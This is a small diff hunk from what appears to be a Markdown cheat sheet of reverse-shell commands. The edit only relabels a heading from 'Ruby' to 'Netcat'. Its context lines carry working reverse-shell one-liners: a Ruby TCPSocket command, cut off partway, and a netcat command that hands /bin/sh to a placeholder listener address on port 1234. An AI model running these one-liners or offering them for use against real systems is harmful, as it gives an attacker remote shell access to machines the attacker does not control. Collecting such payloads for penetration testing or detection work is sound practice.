@@ -108,7 +108,7 @@ ruby -rsocket -e'f=TCPSocket.open("<ip_listener>",1234).to_i;exec sprintf("/bin/
 ```
 
 
-### Ruby
+### Netcat
 
 ```bash
 nc -e /bin/sh <ip_listener> 1234
